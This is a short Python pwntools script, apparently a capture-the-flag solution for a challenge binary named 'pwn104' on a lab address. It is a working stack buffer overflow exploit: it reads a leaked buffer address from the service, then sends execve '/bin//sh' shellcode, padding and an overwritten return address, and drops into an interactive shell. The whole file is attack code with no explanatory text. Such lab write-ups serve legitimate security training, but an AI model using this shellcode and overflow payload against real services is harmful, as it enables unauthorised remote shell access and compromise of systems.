import pwn

# elf = pwn.ELF('./pwn104.pwn104')

# p = elf.process()

p = pwn.remote("10.10.236.218","9004")

print(p.recv().decode('utf-8'))

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

padding = b"A"*(80-len(shellcode))

rbp_padding = b"B"*8

output = p.recv()

buffer_address = int(output.split(b"at")[1].strip().decode("utf-8"),16) 

payload = b"".join(
    [
        shellcode,
        padding,
        rbp_padding,
        pwn.p64(buffer_address)
    ]
)

p.sendline(payload)

p.interactive()